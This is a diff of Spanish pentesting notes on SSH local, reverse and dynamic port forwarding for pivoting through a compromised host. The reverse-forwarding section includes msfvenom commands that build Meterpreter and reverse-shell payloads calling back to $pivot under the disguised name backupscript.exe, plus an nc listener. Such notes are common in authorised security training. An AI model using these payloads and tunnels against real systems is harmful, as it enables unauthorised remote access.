@@ -2,36 +2,58 @@
 ## Port forwarding
 ### SSH - Linux
 #### Local port forwarding
-Es útil para acceder a otras máquinas como si fuéramos la máquina sobre la que ejecutamos el comando. 
+##### Para parecer que el tráfico proviene de localhost 
+Es útil para acceder a servicios locales en una máquina remota como si estuvieran en nuestra máquina local.
 ```bash
-ssh -L 1234:localhost:3306 username@$target
+ssh -NfL 1234:localhost:3306 username@$target
 ```
+- `-N` (No Remote Command)
 Después de escribir esto, el puerto `1234` de nuestra máquina local escucha conexiones, redirigiendo el tráfico al puerto `3306` de `$target`
-Después de esto podríamos ejecutar algo así como 
+Podríamos conectarnos al cliente MySQL de la siguiente manera: 
 ```bash
 mysql -h 127.0.0.1 -P 1234 -u root -p
 # mysql -h localhost -P 1234 -u root -p # -> Podría no funcionar
 ```
-Y para `$target` es como si el tráfico proviniera de localhost
-#### Reverse port forwarding
-Puede ser útil en escenarios como en el que necesitamos que la máquina víctima se comunique con nosotros , pero no tiene una ruta hacia nosotros
+Y desde la perspectiva de `$target` el tráfico parece provenir de `localhost`
+##### Para conectar con `$target` a través de `$pivot`
+Si no tenemos acceso a `$target` desde nuestra pwnbox, pero sí desde `$pivot`, podemos hacer lo siguiente (supongamos que queremos conectarnos vía RDP  a `$target`)
 ```bash
- ssh -R 10.10.14.114:8080:0.0.0.0:8000 username@$pivot -vN
+ssh -NfL 33389:$target:3389 user_on_pivot@$pivot
+```
+Seguido de: 
+```bash
+xfreerdp /v:localhost /u:username_on_target /p:password_on_target /port:33389
+```
+- El tráfico enviado al puerto **`33389`** en tu máquina local será redirigido al puerto **`3389`** en **`$target`** a través de **`$pivot`**.
+- Desde la perspectiva de **`$target`**, el tráfico parece provenir de **`$pivot`**, cumpliendo cualquier restricción que limite las conexiones RDP al origen `$pivot`.
+#### Reverse port forwarding
+Puede ser útil en escenarios como en el que necesitamos que la máquina víctima se comunique con nosotros , pero no tiene una ruta hacia nosotros 
+```bash
+ ssh -R 8080:localhost:8000 username@$pivot -vN
 ```
 Este comando reenviaría el tráfico del puerto `8080` de la máquina víctima al puerto `8000` de nuestra pwnbox
 Se debería crear un exploit como el que sigue: 
 ```bash
 #para meterpreter:
- msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=$pivot -f exe -o backupscript.exe LPORT=8080
+ msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=$pivot -f elf -o backupscript.exe LPORT=8080
 # para revshell normal
-msfvenom -p linux/x64/shell_reverse_tcp lhost=$pivot -f exe -o backupscript.exe LPORT=8080
+msfvenom -p linux/x64/shell_reverse_tcp lhost=$pivot -f elf -o backupscript.exe LPORT=8080
 ```
 Y tras ejecutar este exploit en la máquina víctima podríamos recibir la revshell en nuestra máquina atacante (caso revshell normal)
 ```bash
 nc -nvlp 8000
 ```
+
+- El archivo de configuración `/etc/ssh/sshd_config` debe tener el valor;
+	```bash
+	GatewayPorts yes
+	```
+- Si se ha cambiado el valor, hay que reiniciar el servicio 
+	```bash
+	sudo systemctl restart ssh
+	```
 #### Dynamic Port Forwarding
-Crea un túnel SOCKS (proxy) en el puerto especificado
+Crea un túnel SOCKS (proxy) en el puerto especificado. Cuando se ejecute una herramienta sobre proxychains, para `$target` será como si la conexión fuera de `$pivot`
 ```bash
 ssh -D 9050 ubuntu@$pivot
 # Sin ejecutar comandos (-N) y en background (-f) 
